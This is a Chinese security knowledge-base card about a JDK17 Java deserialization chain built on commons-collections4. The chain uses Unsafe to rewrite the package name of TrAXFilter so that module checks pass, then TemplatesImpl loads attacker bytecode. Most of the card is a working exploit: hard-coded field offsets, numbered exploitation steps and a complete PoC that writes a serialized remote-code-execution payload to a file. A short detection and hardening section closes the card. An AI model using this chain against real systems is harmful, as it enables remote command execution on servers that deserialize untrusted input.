---
id: web-java-deser-jdk17-cc4-package-name-bypass-templatesimpl
title: JDK17 模块封装下 CC4 链改写 Class.packageName 绕过校验触发 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: jdk17-module-bypass-cc4-templatesimpl
tags:
- java
- deserialization
- gadget
- commons-collections4
- cc4
- jdk17
- module-system
- unsafe
- templatesimpl
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T01:56:10+08:00'
  notes: 已对照原文与全部 11 张图核对：JDK17 模块校验调用链、Class.packageName 偏移 60、TrAXFilter/InstantiateTransformer/TemplatesImpl 触发链、_bytecodes.length>1 初始化 _auxClasses、PriorityQueue size=2 均一致；未验证点：offset 60 为原文 JDK17.0.8 实测，换构建需重算，卡片已注明；本地 patchModule 与服务端链的区分表述正确
url: /docs/web/java/deserialization/comparator/web-java-deser-jdk17-cc4-package-name-bypass-templatesimpl/
draft: false
kb_aliases:
- JDK17 CC4
- JDK17 TemplatesImpl 反序列化
- Class.packageName 绕过
- TrAXFilter 模块检测绕过
- Unsafe getAndSetObject 模块绕过
- JDK17 强封装绕过
---

## 一句话结论

在 JDK17 模块强封装下，CC4（commons-collections4 4.0）仍可把 `TemplatesImpl` 作为反序列化 sink：先在 `ChainedTransformer` 链内构造 `Unsafe` 并把 `TrAXFilter` 的 `Class.packageName` 改写为 `javax.xml`，使反射 `newInstance` 的模块校验命中 `java.xml` 的已导出包白名单，再经 `TrAXFilter` 构造器进入 `TemplatesImpl` 加载恶意字节码执行命令。

## 原理

### 1. JDK17 的模块访问校验

JDK9 引入模块系统，JDK17 开始强封装。反射实例化（`Constructor.newInstance`）会进入 `AccessibleObject.slowVerifyAccess` → `Reflection.verifyMemberAccess` → `Reflection.verifyModuleAccess(currentModule, memberClass)`：

```java
Module memberModule = memberClass.getModule();
if (currentModule == memberModule) return true;          // 同模块直接放行
String pkg = memberClass.getPackageName();
return memberModule.isExported(pkg, currentModule);       // 否则检查包是否导出
```

`Module.isExported` 最终走到 `implIsExportedOrOpen`。其中 `isNamed()` 对无名模块放行、`openPackages` 通常为 `null`，最后的希望是 `isStaticallyExportedOrOpen`：

```java
Map<String, Set<Module>> exportedPackages = this.exportedPackages;
if (exportedPackages != null && allows(exportedPackages.get(pn), other)) return true;
```

`allows(targets, module)` 在 `targets != null` 且包含 `EVERYONE_MODULE` 时返回 `true`。`java.xml` 模块的 `exportedPackages` 中含 `javax.xml` 这类对所有模块导出的包，因此**只要让被调用类的 `getPackageName()` 返回 `javax.xml`，校验就会通过**，无需改动 `Module` 本身。

### 2. 为什么改写 Class.packageName 可行

`Class.getPackageName()` 直接返回 `Class` 的私有字段 `packageName`。`Module` 类对反射做了防护（`getDeclaredFields()` 为空），但 `Class.packageName` 是普通字段，可用 `Unsafe.objectFieldOffset(Class.class.getDeclaredField("packageName"))` 取得偏移后用 `Unsafe.getAndSetObject(TrAXFilter.class, offset, "javax.xml")` 改写。原文在 JDK 17.0.8 上该偏移为 60；这是构建相关常量，换 JDK 小版本需重新计算。改写后 `TrAXFilter` 仍属于 `java.xml` 模块，但包名伪装成已导出的 `javax.xml`，`isExported` 命中白名单。

### 3. 在纯 Transformer 链内取得并调用 Unsafe

反序列化链中不能直接传入 `Unsafe` 对象（不可序列化），也不能在链外先执行 `setAccessible`（`Field` 不可序列化）。原文用 commons-collections4 的 Transformer 组合在链内完成：

1. `ConstantTransformer(Unsafe.class)`：把当前输入固定为 `Class` 对象；
2. `InvokerTransformer("getDeclaredField", {String.class}, {"theUnsafe"})`：以 `Class.class` 为接收者取出私有 `Field`；
3. `ClosureTransformer(new TransformerClosure(new InvokerTransformer("setAccessible", {boolean.class}, {true})))`：`ClosureTransformer.transform` 执行 `iClosure.execute(input)` 后 **`return input`**；`TransformerClosure.execute` 执行 `iTransformer.transform(input)` 且忽略返回值。于是 `setAccessible(true)` 的副作用施加在同一个 `Field` 上，而 `Field` 继续作为下一步输入——解决“同一对象需要被调用两次”的问题；
4. `InvokerTransformer("get", {Object.class}, {null})`：对已开放的 `Field` 调 `get(null)`，得到 `Unsafe` 实例；
5. `InvokerTransformer("getAndSetObject", {Object.class, long.class, Object.class}, {TrAXFilter.class, 60L, "javax.xml"})`：完成 `packageName` 改写；
6. `ConstantTransformer(TrAXFilter.class)` + `InstantiateTransformer({Templates.class}, {templates})`：回到标准 CC4 sink，反射调用 `TrAXFilter(Templates)` 构造器。

第 2 步看似不可能，是因为 `InvokerTransformer` 用 `input.getClass()` 取方法所属类：传入 `Unsafe.class` 时 `input.getClass()` 是 `Class.class`，而 `getDeclaredField` 正是 `Class` 的方法，所以成立。

### 4. TemplatesImpl 的触发条件

`TrAXFilter` 构造器调用 `templates.newTransformer()` → `TemplatesImpl.getTransletInstance()` → `defineTransletClasses()`：

```java
final int classCount = _bytecodes.length;
_class = new Class<?>[classCount];
if (classCount > 1) {
    _auxClasses = new HashMap<>();
}
for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i], pd);
    final Class<?> superClass = _class[i].getSuperclass();
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
        _transletIndex = i;
    } else {
        _auxClasses.put(_class[i].getName(), _class[i]);
    }
}
```

- 恶意类**不必继承 `AbstractTranslet`**：只要反射把 `_transletIndex` 设为 0，后续 `_class[0].newInstance()` 就会执行其静态初始化块；
- 但若不继承，会进入 `else` 写入 `_auxClasses`，而该字段默认为 `null` 且不能直接反射设置（其类型 `HashMap` 可序列化，但原文选择另一条路）——因此必须让 `_bytecodes.length > 1`，使 `classCount > 1` 时 `_auxClasses` 被初始化为 `new HashMap<>()`，再放一个凑数的第二段字节码即可；
- `_name` 需非空（`getTransletInstance` 在 `_name == null` 时直接返回 `null`）。

### 5. 触发点

`PriorityQueue.readObject()` → `heapify()` → `siftDown()` → `siftDownUsingComparator()` → `TransformingComparator.compare()` → `ChainedTransformer.transform()`。`PriorityQueue.size` 需 >= 2 才会进入 `siftDown`，原文通过反射把 `size` 设为 2。

原文代码中的 `patchModule(CC4_17.class, ...)` 只在**本地构造 payload** 时使用：把构造者类自身的 `Class.module` 改成目标类所在模块，使本地 `setAccessible` 写 `TemplatesImpl` 私有字段、写 `PriorityQueue.size` 能通过模块校验。它修改的是本地 `Class` 对象，不会被序列化，也不是服务端利用链的一部分；服务端链路依赖的是上述 `packageName` 改写。

## 触发条件

- 目标存在 Java 原生反序列化入口，且未过滤 `PriorityQueue`、`TransformingComparator`、`ChainedTransformer` 等 commons-collections4 类型；
- classpath 含 commons-collections4 4.0（提供 `ClosureTransformer`、`TransformerClosure`、`InstantiateTransformer` 等 functors）；
- JDK17 且仍包含内部 Xalan 的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` / `TrAXFilter`（原文环境 JDK 17.0.8）；
- `sun.misc.Unsafe` 可用（JDK17 默认可通过 `theUnsafe` 反射取得）；
- payload 中的字段偏移与目标 JDK 构建匹配（原文硬编码 60，换版本需重算）；
- 攻击侧能生成恶意 class 字节码，并能反射设置 `TemplatesImpl` 的 `_name`、`_bytecodes`、`_transletIndex` 及 `PriorityQueue.size`（本地可借助 `--add-opens` 或同样的 Unsafe 模块改写）。

## 利用步骤

1. 生成恶意类字节码：静态初始化块执行命令，无需继承 `AbstractTranslet`；再准备任意第二段 class 字节码凑数。
2. 反射构造 `TemplatesImpl`：`_name` 非空、`_bytecodes = {evil, pad}`（长度 > 1，确保 `_auxClasses` 被初始化）、`_transletIndex = 0`。
3. 按“原理 3”的顺序构造 `ChainedTransformer`，依次取得 `Unsafe`、改写 `TrAXFilter.class` 的 `packageName` 为 `javax.xml`。
4. 追加 `ConstantTransformer(TrAXFilter.class)` 与 `InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})`。
5. 用该 `ChainedTransformer` 构造 `TransformingComparator`，放入 `PriorityQueue`，反射设置 `size = 2`。
6. 序列化 `PriorityQueue` 并发送到目标反序列化入口；服务端 `readObject` 重建堆时触发整条链。

## PoC

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.*;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.*;
import java.util.PriorityQueue;

public class Poc {
    public static void main(String[] args) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get("Evil.class")); // static { Runtime.getRuntime().exec(...); }
        byte[] pad  = Files.readAllBytes(Paths.get("Pad.class"));  // 任意类，凑 _bytecodes.length > 1

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "x");
        setField(templates, "_bytecodes", new byte[][]{evil, pad});
        setField(templates, "_transletIndex", 0);

        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Class<?> trAXFilter = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");

        Transformer[] ts = new Transformer[]{
            new ConstantTransformer(unsafeClass),
            new InvokerTransformer("getDeclaredField", new Class[]{String.class}, new Object[]{"theUnsafe"}),
            new ClosureTransformer(new TransformerClosure(
                new InvokerTransformer("setAccessible", new Class[]{boolean.class}, new Object[]{true}))),
            new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
            new InvokerTransformer("getAndSetObject",
                new Class[]{Object.class, long.class, Object.class},
                new Object[]{trAXFilter, 60L, "javax.xml"}),   // 60 为 JDK 17.0.8 的 Class.packageName 偏移
            new ConstantTransformer(trAXFilter),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        TransformingComparator cmp = new TransformingComparator(new ChainedTransformer(ts));
        PriorityQueue<Object> q = new PriorityQueue<>(2, cmp);
        setField(q, "size", 2);   // 本地 JDK17 需 --add-opens java.base/java.util=ALL-UNNAMED 或先改写自身 Class.module

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
            oos.writeObject(q);
        }
    }

    static void setField(Object o, String name, Object v) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);   // JDK17 下对 TemplatesImpl/PriorityQueue 私有字段需先绕过模块校验
        f.set(o, v);
    }
}
```

## 变体与关联

- 变体：触发点可换成 CC6（`TCCL` + `LazyMap`）等其它可达 `ChainedTransformer.transform` 的链，原文指出 CC5/CC6/CC7 也可改造，核心仍是 `packageName` 改写与 `TemplatesImpl` sink。
- 变体（原文提出、未验证）：把调用者与被调用类的 `Class.module` 都用 `Unsafe` 改成 `null`，使 `verifyModuleAccess` 中 `currentModule == memberModule` 或进入无名模块分支；原文未完成验证，confidence 记 low。
- 关联：[[web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl]]（JDK8 版 CC4 基础链）；[[web-java-deser-spring-aop-jdk17-templatesimpl-chain]]（JDK17 下另一条到 TemplatesImpl 的链，其中用 Unsafe 改 `Class.module`）；[[web-java-deserialization-external-xalan-templatesimpl-sink]]（JDK21 内部 Xalan 不可用时的替代 sink）。
- 边界：`Class.packageName` 偏移随 JDK 构建变化；JEP 290 过滤器、`Unsafe` 限制、移除内部 Xalan 或 `commons-collections4` 均会使链失效。

## 检测与防御

- 检测：反序列化流中出现 `PriorityQueue` + `TransformingComparator` + `ChainedTransformer`/`ClosureTransformer`/`TransformerClosure` + `InvokerTransformer` + `TrAXFilter`/`TemplatesImpl` 的组合；运行期对 `Class.packageName`、`Class.module` 的 `Unsafe` 写入；反序列化后异常类加载与 `Runtime.exec`。
- 修复：消除不可信 Java 原生反序列化；从 classpath 移除 commons-collections4 或升级到不含相关 functor 的版本；移除/隔离内部 Xalan。
- 加固：JEP 290 `ObjectInputFilter` 白名单，拒绝 `PriorityQueue`、`TransformingComparator`、`ChainedTransformer`、`TemplatesImpl`、`TrAXFilter` 等非业务类；限制 `sun.misc.Unsafe` 的使用（新 JDK 对内存访问方法告警/移除）；不要依赖 JDK17 模块封装作为唯一防线。
